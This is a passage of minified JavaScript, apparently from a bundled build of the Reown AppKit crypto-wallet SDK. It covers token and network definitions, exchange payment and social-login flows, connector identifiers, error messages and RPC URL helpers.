USD",symbol:"USDT",decimals:6}},p9e={network:"eip155:10",asset:"0x94b008aA00579c1307B0EF2c499aD98a8ce58e58",metadata:{name:"Tether USD",symbol:"USDT",decimals:6}},m9e={network:"eip155:42161",asset:"0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9",metadata:{name:"Tether USD",symbol:"USDT",decimals:6}},g9e={network:"eip155:137",asset:"0xc2132d05d31c914a87c6611c10748aeb04b58e8f",metadata:{name:"Tether USD",symbol:"USDT",decimals:6}},y9e={network:"solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp",asset:"Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB",metadata:{name:"Tether USD",symbol:"USDT",decimals:6}},b9e={network:"solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp",asset:"native",metadata:{name:"Solana",symbol:"SOL",decimals:9}},w9e={ethereumETH:s9e,baseETH:o9e,baseUSDC:vae,baseSepoliaETH:c9e,ethereumUSDC:u9e,arbitrumUSDC:l9e,polygonUSDC:d9e,solanaUSDC:f9e,ethereumUSDT:h9e,optimismUSDT:p9e,arbitrumUSDT:m9e,polygonUSDT:g9e,solanaUSDT:y9e,solanaSOL:b9e};function v9e(t){return Object.values(w9e).filter(e=>e.network===t)}const E9e=0,Eae={paymentAsset:null,amount:null,tokenAmount:0,priceLoading:!1,error:null,exchanges:[],isLoading:!1,currentPayment:void 0,isPaymentInProgress:!1,paymentId:"",assets:[]},Nt=ar(Eae),Hi={state:Nt,subscribe(t){return ji(Nt,()=>t(Nt))},subscribeKey(t,e){return Mi(Nt,t,e)},resetState(){Object.assign(Nt,{...Eae})},async getAssetsForNetwork(t){const e=v9e(t),n=await Hi.getAssetsImageAndPrice(e),r=e.map(i=>{const s=i.asset==="native"?wx():`${i.network}:${i.asset}`,o=n.find(a=>a.fungibles?.[0]?.address?.toLowerCase()===s.toLowerCase());return{...i,price:o?.fungibles?.[0]?.price||1,metadata:{...i.metadata,iconUrl:o?.fungibles?.[0]?.iconUrl}}});return Nt.assets=r,r},async getAssetsImageAndPrice(t){const e=t.map(r=>r.asset==="native"?wx():`${r.network}:${r.asset}`);return await Promise.all(e.map(r=>Bt.fetchTokenPrice({addresses:[r]})))},getTokenAmount(){if(!Nt?.paymentAsset?.price)throw new Error("Cannot get token price");const t=CE.bigNumber(Nt.amount??0).round(8),e=CE.bigNumber(Nt.paymentAsset.price).round(8);return t.div(e).round(8).toNumber()},setAmount(t){Nt.amount=t,Nt.paymentAsset?.price&&(Nt.tokenAmount=Hi.getTokenAmount())},setPaymentAsset(t){Nt.paymentAsset=t},isPayWithExchangeEnabled(){return de.state.remoteFeatures?.payWithExchange},isPayWithExchangeSupported(){return Hi.isPayWithExchangeEnabled()&&Y.state.activeCaipNetwork&&jt.PAY_WITH_EXCHANGE_SUPPORTED_CHAIN_NAMESPACES.includes(Y.state.activeCaipNetwork.chainNamespace)},async fetchExchanges(){try{const t=Hi.isPayWithExchangeSupported();if(!Nt.paymentAsset||!t){Nt.exchanges=[],Nt.isLoading=!1;return}Nt.isLoading=!0;const e=await n9e({page:E9e,asset:VV(Nt.paymentAsset.network,Nt.paymentAsset.asset),amount:Nt.amount?.toString()??"0"});Nt.exchanges=e.exchanges.slice(0,2)}catch{throw on.showError("Unable to get exchanges"),new Error("Unable to get exchanges")}finally{Nt.isLoading=!1}},async getPayUrl(t,e){try{const n=Number(e.amount),r=await r9e({exchangeId:t,asset:VV(e.network,e.asset),amount:n.toString(),recipient:`${e.network}:${e.recipient}`});return tt.sendEvent({type:"track",event:"PAY_EXCHANGE_SELECTED",properties:{exchange:{id:t},configuration:{network:e.network,asset:e.asset,recipient:e.recipient,amount:n},currentPayment:{type:"exchange",exchangeId:t},source:"fund-from-exchange",headless:!1}}),r}catch(n){throw n instanceof Error&&n.message.includes("is not supported")?new Error("Asset not supported"):new Error(n.message)}},async handlePayWithExchange(t){try{const e=Y.getAccountData()?.address;if(!e)throw new Error("No account connected");if(!Nt.paymentAsset)throw new Error("No payment asset selected");const n=xe.returnOpenHref("","popupWindow","scrollbar=yes,width=480,height=720");if(!n)throw new Error("Could not create popup window");Nt.isPaymentInProgress=!0,Nt.paymentId=crypto.randomUUID(),Nt.currentPayment={type:"exchange",exchangeId:t};const{network:r,asset:i}=Nt.paymentAsset,s={network:r,asset:i,amount:Nt.tokenAmount,recipient:e},o=await Hi.getPayUrl(t,s);if(!o){try{n.close()}catch(a){console.error("Unable to close popup window",a)}throw new Error("Unable to initiate payment")}Nt.currentPayment.sessionId=o.sessionId,Nt.currentPayment.status="IN_PROGRESS",Nt.currentPayment.exchangeId=t,n.location.href=o.url}catch{Nt.error="Unable to initiate payment",on.showError(Nt.error)}},async waitUntilComplete({exchangeId:t,sessionId:e,paymentId:n,retries:r=20}){const i=await Hi.getBuyStatus(t,e,n);if(i.status==="SUCCESS"||i.status==="FAILED")return i;if(r===0)throw new Error("Unable to get deposit status");return await new Promise(s=>{setTimeout(s,5e3)}),Hi.waitUntilComplete({exchangeId:t,sessionId:e,paymentId:n,retries:r-1})},async getBuyStatus(t,e,n){try{if(!Nt.currentPayment)throw new Error("No current payment");const r=await i9e({sessionId:e,exchangeId:t});if(Nt.currentPayment.status=r.status,r.status==="SUCCESS"||r.status==="FAILED"){const i=Y.getAccountData()?.address;Nt.currentPayment.result=r.txHash,Nt.isPaymentInProgress=!1,tt.sendEvent({type:"track",event:r.status==="SUCCESS"?"PAY_SUCCESS":"PAY_ERROR",properties:{message:r.status==="FAILED"?xe.parseError(Nt.error):void 0,source:"fund-from-exchange",paymentId:n,configuration:{network:Nt.paymentAsset?.network||"",asset:Nt.paymentAsset?.asset||"",recipient:i||"",amount:Nt.amount??0},currentPayment:{type:"exchange",exchangeId:Nt.currentPayment?.exchangeId,sessionId:Nt.currentPayment?.sessionId,result:r.txHash}}})}return r}catch{return{status:"UNKNOWN",txHash:""}}},reset(){Nt.currentPayment=void 0,Nt.isPaymentInProgress=!1,Nt.paymentId="",Nt.paymentAsset=null,Nt.amount=0,Nt.tokenAmount=0,Nt.priceLoading=!1,Nt.error=null,Nt.exchanges=[],Nt.isLoading=!1}};function _9e(){try{return xe.returnOpenHref(`${ge.SECURE_SITE_SDK_ORIGIN}/loading`,"popupWindow","width=600,height=800,scrollbars=yes")}catch{throw new Error("Could not open social popup")}}async function A9e(){we.push("ConnectingFarcaster");const t=Ce.getAuthConnector();if(t&&!Y.getAccountData()?.farcasterUrl)try{const{url:n}=await t.provider.getFarcasterUri();Y.setAccountProp("farcasterUrl",n,Y.state.activeChain)}catch(n){we.goBack(),on.showError(n)}}async function C9e(t){we.push("ConnectingSocial");const e=Ce.getAuthConnector();let n=null;try{const r=setTimeout(()=>{throw new Error("Social login timed out. Please try again.")},45e3);if(e&&t){if(xe.isTelegram()||(n=_9e()),n)Y.setAccountProp("socialWindow",g1(n),Y.state.activeChain);else if(!xe.isTelegram())throw new Error("Could not create social popup");const{uri:i}=await e.provider.getSocialRedirectUri({provider:t});if(!i)throw n?.close(),new Error("Could not fetch the social redirect uri");if(n&&(n.location.href=i),xe.isTelegram()){Be.setTelegramSocialProvider(t);const s=xe.formatTelegramSocialLoginUrl(i);xe.openHref(s,"_top")}clearTimeout(r)}}catch(r){n?.close();const i=xe.parseError(r);on.showError(i),tt.sendEvent({type:"track",event:"SOCIAL_LOGIN_ERROR",properties:{provider:t,message:i}})}}async function S9e(t){Y.setAccountProp("socialProvider",t,Y.state.activeChain),tt.sendEvent({type:"track",event:"SOCIAL_LOGIN_STARTED",properties:{provider:t}}),t==="farcaster"?await A9e():await C9e(t)}const sn={METMASK_CONNECTOR_NAME:"MetaMask",TRUST_CONNECTOR_NAME:"Trust Wallet",SOLFLARE_CONNECTOR_NAME:"Solflare",PHANTOM_CONNECTOR_NAME:"Phantom",COIN98_CONNECTOR_NAME:"Coin98",MAGIC_EDEN_CONNECTOR_NAME:"Magic Eden",BACKPACK_CONNECTOR_NAME:"Backpack",BITGET_CONNECTOR_NAME:"Bitget Wallet",FRONTIER_CONNECTOR_NAME:"Frontier",XVERSE_CONNECTOR_NAME:"Xverse Wallet",LEATHER_CONNECTOR_NAME:"Leather",OKX_CONNECTOR_NAME:"OKX Wallet",BINANCE_CONNECTOR_NAME:"Binance Wallet",EIP155:ge.CHAIN.EVM,ADD_CHAIN_METHOD:"wallet_addEthereumChain",EIP6963_ANNOUNCE_EVENT:"eip6963:announceProvider",EIP6963_REQUEST_EVENT:"eip6963:requestProvider",CONNECTOR_RDNS_MAP:{coinbaseWallet:"com.coinbase.wallet",coinbaseWalletSDK:"com.coinbase.wallet"},CONNECTOR_TYPE_EXTERNAL:"EXTERNAL",CONNECTOR_TYPE_WALLET_CONNECT:"WALLET_CONNECT",CONNECTOR_TYPE_INJECTED:"INJECTED",CONNECTOR_TYPE_ANNOUNCED:"ANNOUNCED",CONNECTOR_TYPE_AUTH:"AUTH",CONNECTOR_TYPE_MULTI_CHAIN:"MULTI_CHAIN",CONNECTOR_TYPE_W3M_AUTH:"AUTH",getSDKVersionWarningMessage(t,e){return`
     @@@@@@@           @@@@@@@@@@@@@@@@@@      
   @@@@@@@@@@@      @@@@@@@@@@@@@@@@@@@@@@@@   
  @@@@@@@@@@@@@    @@@@@@@@@@@@@@@@@@@@@@@@@@  
 @@@@@@@@@@@@@@@  @@@@@@@@@@@@@@@@@@@@@@@@@@@  
 @@@@@@@@@@@@@@@  @@@@@@@@@@@@@@   @@@@@@@@@@@ 
 @@@@@@@@@@@@@@@  @@@@@@@@@@@@@   @@@@@@@@@@@@ 
 @@@@@@@@@@@@@@@  @@@@@@@@@@@@@  @@@@@@@@@@@@@
 @@@@@@@@@@@@@@@  @@@@@@@@@@@@   @@@@@@@@@@@@@    
 @@@@@@   @@@@@@  @@@@@@@@@@@   @@@@@@@@@@@@@@    
 @@@@@@   @@@@@@  @@@@@@@@@@@  @@@@@@@@@@@@@@@ 
 @@@@@@@@@@@@@@@  @@@@@@@@@@   @@@@@@@@@@@@@@@ 
 @@@@@@@@@@@@@@@  @@@@@@@@@@@@@@@@@@@@@@@@@@@  
  @@@@@@@@@@@@@    @@@@@@@@@@@@@@@@@@@@@@@@@@  
   @@@@@@@@@@@      @@@@@@@@@@@@@@@@@@@@@@@@   
      @@@@@            @@@@@@@@@@@@@@@@@@  
      
AppKit SDK version ${t} is outdated. Latest version is ${e}. Please update to the latest version for bug fixes and new features.
            
Changelog: https://github.com/reown-com/appkit/releases
NPM Registry: https://www.npmjs.com/package/@reown/appkit`}},Ga={ConnectorExplorerIds:{[ge.CONNECTOR_ID.COINBASE]:"fd20dc426fb37566d803205b19bbc1d4096b248ac04548e3cfb6b3a38bd033aa",[ge.CONNECTOR_ID.COINBASE_SDK]:"fd20dc426fb37566d803205b19bbc1d4096b248ac04548e3cfb6b3a38bd033aa",[ge.CONNECTOR_ID.BASE_ACCOUNT]:"fd20dc426fb37566d803205b19bbc1d4096b248ac04548e3cfb6b3a38bd033aa",[ge.CONNECTOR_ID.SAFE]:"225affb176778569276e484e1b92637ad061b01e13a048b35a9d280c3b58970f",[ge.CONNECTOR_ID.LEDGER]:"19177a98252e07ddfc9af2083ba8e07ef627cb6103467ffebb3f8f4205fd7927",[ge.CONNECTOR_ID.OKX]:"971e689d0a5be527bac79629b4ee9b925e82208e5168b733496a09c0faed0709",[sn.METMASK_CONNECTOR_NAME]:"c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96",[sn.TRUST_CONNECTOR_NAME]:"4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0",[sn.SOLFLARE_CONNECTOR_NAME]:"1ca0bdd4747578705b1939af023d120677c64fe6ca76add81fda36e350605e79",[sn.PHANTOM_CONNECTOR_NAME]:"a797aa35c0fadbfc1a53e7f675162ed5226968b44a19ee3d24385c64d1d3c393",[sn.COIN98_CONNECTOR_NAME]:"2a3c89040ac3b723a1972a33a125b1db11e258a6975d3a61252cd64e6ea5ea01",[sn.MAGIC_EDEN_CONNECTOR_NAME]:"8b830a2b724a9c3fbab63af6f55ed29c9dfa8a55e732dc88c80a196a2ba136c6",[sn.BACKPACK_CONNECTOR_NAME]:"2bd8c14e035c2d48f184aaa168559e86b0e3433228d3c4075900a221785019b0",[sn.BITGET_CONNECTOR_NAME]:"38f5d18bd8522c244bdd70cb4a68e0e718865155811c043f052fb9f1c51de662",[sn.FRONTIER_CONNECTOR_NAME]:"85db431492aa2e8672e93f4ea7acf10c88b97b867b0d373107af63dc4880f041",[sn.XVERSE_CONNECTOR_NAME]:"2a87d74ae02e10bdd1f51f7ce6c4e1cc53cd5f2c0b6b5ad0d7b3007d2b13de7b",[sn.LEATHER_CONNECTOR_NAME]:"483afe1df1df63daf313109971ff3ef8356ddf1cc4e45877d205eee0b7893a13",[sn.OKX_CONNECTOR_NAME]:"971e689d0a5be527bac79629b4ee9b925e82208e5168b733496a09c0faed0709",[sn.BINANCE_CONNECTOR_NAME]:"2fafea35bb471d22889ccb49c08d99dd0a18a37982602c33f696a5723934ba25"},NetworkImageIds:{1:"ba0ba0cd-17c6-4806-ad93-f9d174f17900",42161:"3bff954d-5cb0-47a0-9a23-d20192e74600",43114:"30c46e53-e989-45fb-4549-be3bd4eb3b00",56:"93564157-2e8e-4ce7-81df-b264dbee9b00",250:"06b26297-fe0c-4733-5d6b-ffa5498aac00",10:"ab9c186a-c52f-464b-2906-ca59d760a400",137:"41d04d42-da3b-4453-8506-668cc0727900",5e3:"e86fae9b-b770-4eea-e520-150e12c81100",295:"6a97d510-cac8-4e58-c7ce-e8681b044c00",11155111:"e909ea0a-f92a-4512-c8fc-748044ea6800",84532:"a18a7ecd-e307-4360-4746-283182228e00",1301:"4eeea7ef-0014-4649-5d1d-07271a80f600",130:"2257980a-3463-48c6-cbac-a42d2a956e00",10143:"0a728e83-bacb-46db-7844-948f05434900",100:"02b53f6a-e3d4-479e-1cb4-21178987d100",9001:"f926ff41-260d-4028-635e-91913fc28e00",324:"b310f07f-4ef7-49f3-7073-2a0a39685800",314:"5a73b3dd-af74-424e-cae0-0de859ee9400",4689:"34e68754-e536-40da-c153-6ef2e7188a00",1088:"3897a66d-40b9-4833-162f-a2c90531c900",1284:"161038da-44ae-4ec7-1208-0ea569454b00",1285:"f1d73bb6-5450-4e18-38f7-fb6484264a00",7777777:"845c60df-d429-4991-e687-91ae45791600",42220:"ab781bbc-ccc6-418d-d32d-789b15da1f00",8453:"7289c336-3981-4081-c5f4-efc26ac64a00",1313161554:"3ff73439-a619-4894-9262-4470c773a100",2020:"b8101fc0-9c19-4b6f-ec65-f6dfff106e00",2021:"b8101fc0-9c19-4b6f-ec65-f6dfff106e00",80094:"e329c2c9-59b0-4a02-83e4-212ff3779900",2741:"fc2427d1-5af9-4a9c-8da5-6f94627cd900","5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp":"a1b58899-f671-4276-6a5e-56ca5bd59700","4uhcVJyU9pJkvQyS88uRDiswHXSCkY3z":"a1b58899-f671-4276-6a5e-56ca5bd59700",EtWTRABZaYq6iMfeYKouRu166VU2xqa1:"a1b58899-f671-4276-6a5e-56ca5bd59700","000000000019d6689c085ae165831e93":"0b4838db-0161-4ffe-022d-532bf03dba00","000000000933ea01ad0ee984209779ba":"39354064-d79b-420b-065d-f980c4b78200","00000008819873e925422c1ff0f99f7c":"b3406e4a-bbfc-44fb-e3a6-89673c78b700","-239":"20f673c0-095e-49b2-07cf-eb5049dcf600","-3":"20f673c0-095e-49b2-07cf-eb5049dcf600"},ConnectorImageIds:{[ge.CONNECTOR_ID.COINBASE]:"0c2840c3-5b04-4c44-9661-fbd4b49e1800",[ge.CONNECTOR_ID.COINBASE_SDK]:"0c2840c3-5b04-4c44-9661-fbd4b49e1800",[ge.CONNECTOR_ID.BASE_ACCOUNT]:"bba2c8be-7fd1-463e-42b1-796ecb0ad200",[ge.CONNECTOR_ID.SAFE]:"461db637-8616-43ce-035a-d89b8a1d5800",[ge.CONNECTOR_ID.LEDGER]:"54a1aa77-d202-4f8d-0fb2-5d2bb6db0300",[ge.CONNECTOR_ID.WALLET_CONNECT]:"ef1a1fcf-7fe8-4d69-bd6d-fda1345b4400",[ge.CONNECTOR_ID.INJECTED]:"07ba87ed-43aa-4adf-4540-9e6a2b9cae00"},ConnectorNamesMap:{[ge.CONNECTOR_ID.INJECTED]:"Browser Wallet",[ge.CONNECTOR_ID.WALLET_CONNECT]:"WalletConnect",[ge.CONNECTOR_ID.COINBASE]:"Coinbase",[ge.CONNECTOR_ID.COINBASE_SDK]:"Coinbase",[ge.CONNECTOR_ID.BASE_ACCOUNT]:"Base Account",[ge.CONNECTOR_ID.LEDGER]:"Ledger",[ge.CONNECTOR_ID.SAFE]:"Safe"},ConnectorTypesMap:{[ge.CONNECTOR_ID.INJECTED]:"INJECTED",[ge.CONNECTOR_ID.WALLET_CONNECT]:"WALLET_CONNECT",[ge.CONNECTOR_ID.EIP6963]:"ANNOUNCED",[ge.CONNECTOR_ID.AUTH]:"AUTH",[sn.CONNECTOR_TYPE_AUTH]:"AUTH"}},Gr={getCaipTokens(t){if(!t)return;const e={};return Object.entries(t).forEach(([n,r])=>{e[`${sn.EIP155}:${n}`]=r}),e},isLowerCaseMatch(t,e){return t?.toLowerCase()===e?.toLowerCase()},getActiveNamespaceConnectedToAuth(){const t=Y.state.activeChain;return ge.AUTH_CONNECTOR_SUPPORTED_CHAINS.find(e=>Ce.getConnectorId(e)===ge.CONNECTOR_ID.AUTH&&e===t)},withRetry({conditionFn:t,intervalMs:e,maxRetries:n}){let r=0;return new Promise(i=>{async function s(){return r+=1,await t()?i(!0):r>=n?i(!1):(setTimeout(s,e),null)}s()})},userChainIdToChainNamespace(t){if(typeof t=="number")return ge.CHAIN.EVM;const[e]=t.split(":");return e},getOtherAuthNamespaces(t){return t?ge.AUTH_CONNECTOR_SUPPORTED_CHAINS.filter(r=>r!==t):[]},getConnectorStorageInfo(t,e){const r=Be.getConnections()[e]??[];return{hasDisconnected:Be.isConnectorDisconnected(t,e),hasConnected:r.some(i=>Gr.isLowerCaseMatch(i.connectorId,t))}}},T9e=new AbortController,Es={EmbeddedWalletAbortController:T9e,UniversalProviderErrors:{UNAUTHORIZED_DOMAIN_NOT_ALLOWED:{message:"Unauthorized: origin not allowed",alertErrorKey:"ORIGIN_NOT_ALLOWED"},JWT_VALIDATION_ERROR:{message:"JWT validation error: JWT Token is not yet valid",alertErrorKey:"JWT_TOKEN_NOT_VALID"},INVALID_KEY:{message:"Unauthorized: invalid key",alertErrorKey:"INVALID_PROJECT_ID"}},ALERT_ERRORS:{SWITCH_NETWORK_NOT_FOUND:{code:"APKT001",displayMessage:"Network Not Found",debugMessage:"The specified network is not recognized. Please ensure it is included in the `networks` array of your `createAppKit` configuration."},ORIGIN_NOT_ALLOWED:{code:"APKT002",displayMessage:"Invalid App Configuration",debugMessage:()=>`The origin ${q2()?window.origin:"unknown"} is not in your allow list. Please update your allowed domains at https://dashboard.reown.com. [PID: ${de.state.projectId}]`},IFRAME_LOAD_FAILED:{code:"APKT003",displayMessage:"Network Error: Wallet Load Failed",debugMessage:()=>"Failed to load the embedded wallet. This may be due to network issues or server downtime. Please check your network connection and try again shortly. Contact support if the issue persists."},IFRAME_REQUEST_TIMEOUT:{code:"APKT004",displayMessage:"Wallet Request Timeout",debugMessage:()=>"The request to the embedded wallet timed out. Please check your network connection and try again shortly. Contact support if the issue persists."},UNVERIFIED_DOMAIN:{code:"APKT005",displayMessage:"Unverified Domain",debugMessage:()=>"Embedded wallet load failed. Ensure your domain is verified in https://dashboard.reown.com."},JWT_TOKEN_NOT_VALID:{code:"APKT006",displayMessage:"Session Expired",debugMessage:"Your session is invalid or expired. Please check your systems date and time settings, then reconnect."},INVALID_PROJECT_ID:{code:"APKT007",displayMessage:"Invalid Project ID",debugMessage:"The specified project ID is invalid. Please visit https://dashboard.reown.com to obtain a valid project ID."},PROJECT_ID_NOT_CONFIGURED:{code:"APKT008",displayMessage:"Project ID Missing",debugMessage:"No project ID is configured. You can create and configure a project ID at https://dashboard.reown.com."},SERVER_ERROR_APP_CONFIGURATION:{code:"APKT009",displayMessage:"Server Error",debugMessage:t=>`Unable to fetch App Configuration. ${t}. Please check your network connection and try again shortly. Contact support if the issue persists.`},RATE_LIMITED_APP_CONFIGURATION:{code:"APKT010",displayMessage:"Rate Limited",debugMessage:"You have been rate limited while retrieving App Configuration. Please wait a few minutes and try again. Contact support if the issue persists."}},ALERT_WARNINGS:{LOCAL_CONFIGURATION_IGNORED:{debugMessage:t=>`[Reown Config Notice] ${t}`},INACTIVE_NAMESPACE_NOT_CONNECTED:{code:"APKTW001",displayMessage:"Inactive Namespace Not Connected",debugMessage:(t,e)=>`An error occurred while connecting an inactive namespace ${t}: "${e}"`},INVALID_EMAIL:{code:"APKTW002",displayMessage:"Invalid Email Address",debugMessage:"Please enter a valid email address"}}},_ae={TOKEN_ADDRESSES_BY_SYMBOL:{USDC:{8453:vae.asset,84532:a9e.asset}},getTokenSymbolByAddress(t){if(!t)return;const[e]=Object.entries(_ae.TOKEN_ADDRESSES_BY_SYMBOL).find(([n,r])=>Object.values(r).includes(t))??[];return e}},x9e={createLogger(t,e="error"){const n=eB({level:e}),{logger:r}=$I({opts:n});return r.error=(...i)=>{for(const s of i)if(s instanceof Error){t(s,...i);return}t(void 0,...i)},r}},I9e="rpc.walletconnect.org";function WV(t,e){const n=new URL("https://rpc.walletconnect.org/v1/");return n.searchParams.set("chainId",t),n.searchParams.set("projectId",e),n.toString()}const $9=["near:mainnet","solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp","eip155:1101","eip155:56","eip155:42161","eip155:7777777","eip155:59144","eip155:324","solana:EtWTRABZaYq6iMfeYKouRu166VU2xqa1","eip155:5000","solana:4sgjmw1sunhzsxgspuhpqldx6wiyjntz","eip155:80084","eip155:5003","eip155:100","eip155:8453","eip155:42220","eip155:1313161555","eip155:17000","eip155:1","eip155:300","eip155:1313161554","eip155:1329","eip155:84532","eip155:421614","eip155:11155111","eip155:8217","eip155:43114","solana:4uhcVJyU9pJkvQyS88uRDiswHXSCkY3z","eip155:999999999","eip155:11155420","eip155:80002","eip155:97","eip155:43113","eip155:137","eip155:10","eip155:1301","eip155:80094","eip155:80069","eip155:560048","eip155:31","eip155:2818","eip155:57054","eip155:911867","eip155:534351","eip155:1112","eip155:534352","eip155:1111","eip155:146","eip155:130","eip155:1284","eip155:30","eip155:2810","bip122:000000000019d6689c085ae165831e93","bip122:000000000933ea01ad0ee984209779ba"],Rm={extendRpcUrlWithProjectId(t,e){let n=!1;try{n=new URL(t).host===I9e}catch{n=!1}if(n){const r=new URL(t);return r.searchParams.has("projectId")||r.searchParams.set("projectId",e),r.toString()}return t},isCaipNetwork(t){return"chainNamespace"in t&&"caipNetworkId"in t},getChainNamespace(t){return this.isCaipNetwork(t)?t.chainNamespace:ge.CHAIN.EVM},getCaipNetworkId(t){return this.isCaipNetwork(t)?t.caipNetworkId:`${ge.CHAIN.EVM}:${t.id}`},getDefaultRpcUrl(t,e,n){const r=t.rpcUrls?.default?.http?.[0];return $9.includes(e)?WV(e,n):r||""},extendCaipNetwork(t,{customNetworkImageUrls:e,projectId:n,customRpcUrls:r}){const i=this.getChainNamespace(t),s=this.getCaipNetworkId(t),o=t.rpcUrls?.default?.http?.[0],a=this.getDefaultRpcUrl(t,s,n),c=t?.rpcUrls?.chainDefault?.http?.[0]||o,l=r?.[s]?.map(m=>m.url)||[],f=[...l,...a?[a]:[]],h=[...l];return c&&!h.includes(c)&&h.push(c),{...t,chainNamespace:i,caipNetworkId:s,assets:{imageId:Ga.NetworkImageIds[t.id],imageUrl:e?.[t.id]},rpcUrls:{...t.rpcUrls,default:{http:f},chainDefault:{http:h}}}},extendCaipNetworks(t,{customNetworkImageUrls:e,projectId:n,customRpcUrls:r}){return t.map(i=>Rm.extendCaipNetwork(i,{customNetworkImageUrls:e,customRpcUrls:r,projectId:n}))},getViemTransport(t,e,n){const r=[];return n?.forEach(i=>{r.push(N3(i.url,i.config))}),$9.includes(t.caipNetworkId)&&r.push(N3(WV(t.caipNetworkId,e),{fetchOptions:{headers:{"Content-Type":"text/plain"}}})),t?.rpcUrls?.default?.http?.forEach(i=>{r.push(N3(i))}),vH(r)},extendWagmiTransports(t,e,n){if($9.includes(t.caipNetworkId)){const r=this.getDefaultRpcUrl(t,t.caipNetworkId,e);return vH([n,N3(r)])}return n},getUnsupportedNetwork(t){return{id:t.split(":")[1],caipNetworkId:t,name:ge.UNSUPPORTED_NETWORK_NAME,chainNamespace:t.split(":")[0],nativeCurrency:{name:"",decimals:0,symbol:""},rpcUrls:{default:{http:[]}}}},getCaipNetworkFromStorage(t){const e=Be.getActiveCaipNetworkId(),n=Y.getAllRequestedCaipNetworks(),r=Array.from(Y.state.chains?.keys()||[]),i=e?.split(":")[0],s=i?r.includes(i):!1,o=n?.find(c=>c.caipNetworkId===e);return s&&!o&&e?this.getUnsupportedNetwork(e):o||t||n?.[0]}};class dE{constructor(){}static getInstance({projectId:e,chainId:n,enableLogger:r,onTimeout:i,abortController:s,getActiveCaipNetwork:o,getCaipNetworks:a}){const{metadata:c,sdkVersion:l,sdkType:f}=de.getSnapshot();return dE.instance||(dE.instance=new kre({projectId:e,chainId:n,enableLogger:r,onTimeout:i,abortController:s,getActiveCaipNetwork:o,getCaipNetworks:a,enableCloudAuthAccount:!!de.state.remoteFeatures?.emailCapture,metadata:c,sdkVersion:l,sdkType:f})),dE.instance}}var GV={};const Z2={ACCOUNT_TABS:[{label:"Tokens"},{label:"Activity"}],SECURE_SITE_ORIGIN:(typeof process<"u"&&typeof GV<"u"?GV.NEXT_PUBLIC_SECURE_SITE_ORIGIN:void 0)||"https://secure.walletconnect.org",VIEW_DIRECTION:{Next:"next",Prev:"prev"},DEFAULT_CONNECT_METHOD_ORDER:["email","social","wallet"],ANIMATION_DURATIONS:{HeaderText:120},VIEWS_WITH_LEGAL_FOOTER:["Connect","ConnectWallets","OnRampTokenSelect","OnRampFiatSelect","OnRampProviders"],VIEWS_WITH_DEFAULT_FOOTER:["Networks"]},R9e=[Ga.ConnectorExplorerIds[ge.CONNECTOR_ID.COINBASE],Ga.ConnectorExplorerIds[ge.CONNECTOR_ID.COINBASE_SDK],Ga.ConnectorExplorerIds[ge.CONNECTOR_ID.BASE_ACCOUNT],Ga.ConnectorExplorerIds[sn.SOLFLARE_CONNECTOR_NAME],Ga.ConnectorExplorerIds[sn.PHANTOM_CONNECTOR_NAME],Ga.ConnectorExplorerIds[sn.BINANCE_CONNECTOR_NAME]],Uc={filterOutDuplicatesByRDNS(t){const e=de.state.enableEIP6963?Ce.state.connectors:[],n=Be.getRecentWallets(),r=e.map(a=>a.info?.rdns).filter(Boolean),i=n.map(a=>a.rdns).filter(Boolean),s=r.concat(i);if(s.includes("io.metamask.mobile")&&xe.isMobile()){const a=s.indexOf("io.metamask.mobile");s[a]="io.metamask"}return t.filter(a=>!(a?.rdns&&s.includes(String(a.rdns))||!a?.rdns&&e.some(l=>l.name===a.name)))},filterOutDuplicatesByIds(t){const e=Ce.state.connectors.filter(a=>a.type==="ANNOUNCED"||a.type==="INJECTED"||a.type==="MULTI_CHAIN"),n=Be.getRecentWallets(),r=e.map(a=>a.explorerId||a.explorerWallet?.id||a.id),i=n.map(a=>a.id),s=r.concat(i);return t.filter(a=>!s.includes(a?.id))},filterOutDuplicateWallets(t){const e=this.filterOutDuplicatesByRDNS(t);return this.filterOutDuplicatesByIds(e)},markWalletsAsInstalled(t){const{connectors:e}=Ce.state,{featuredWalletIds:n}=de.state,r=e.filter(o=>o.type==="ANNOUNCED").reduce((o,a)=>(a.info?.rdns&&(o[a.info.rdns]=!0),o),{});return t.map(o=>({...o,installed:!!o.rdns&&!!r[o.rdns??""]})).sort((o,a)=>{const c=Number(a.installed)-Number(o.installed);if(c!==0)return c;if(n?.length){const l=n.indexOf(o.id),f=n.indexOf(a.id);if(l!==-1&&f!==-1)return l-f;if(l!==-1)return-1;if(f!==-1)return 1}return 0})},getConnectOrderMethod(t,e){const n=t?.connectMethodsOrder||de.state.features?.connectMethodsOrder,r=e||Ce.state.connectors;if(n)return n;const{injected:i,announced:s}=Va.getConnectorsByType(r,Ge.state.recommended,Ge.state.featured),o=i.filter(Va.showConnector),a=s.filter(Va.showConnector);return o.length||a.length?["wallet","email","social"]:Z2.DEFAULT_CONNECT_METHOD_ORDER},isExcluded(t){const e=!!t.rdns&&Ge.state.excludedWallets.some(r=>r.rdns===t.rdns),n=!!t.name&&Ge.state.excludedWallets.some(r=>Gr.isLowerCaseMatch(r.name,t.name));return e||n},markWalletsWithDisplayIndex(t){return t.map((e,n)=>({...e,display_index:n}))},filterWalletsByWcSupport(t){return ke.state.wcBasic?t.filter(e=>e.supports_wc):xe.isMobile()?t.filter(e=>e.supports_wc||R9e.includes(e.id)):t}},Va={getConnectorsByType(t,e,n){const{customWallets:r}=de.state,i=Be.getRecentWallets(),s=Uc.filterOutDuplicateWallets(e),o=Uc.filterOutDuplicateWallets(n),a=t.filter(h=>h.type==="MULTI_CHAIN"),c=t.filter(h=>h.type==="ANNOUNCED"),l=t.filter(h=>h.type==="INJECTED"),f=t.filter(h=>h.type==="EXTERNAL");return{custom:r,recent:i,external:f,multiChain:a,announced:c,injected:l,recommended:s,featured:o}},showConnector(t){const e=t.info?.rdns,n=!!e&&Ge.state.excludedWallets.some(i=>!!i.rdns&&i.rdns===e),r=!!t.name&&Ge.state.excludedWallets.some(i=>Gr.isLowerCaseMatch(i.name,t.name));return!(t.type==="INJECTED"&&(t.name==="Browser 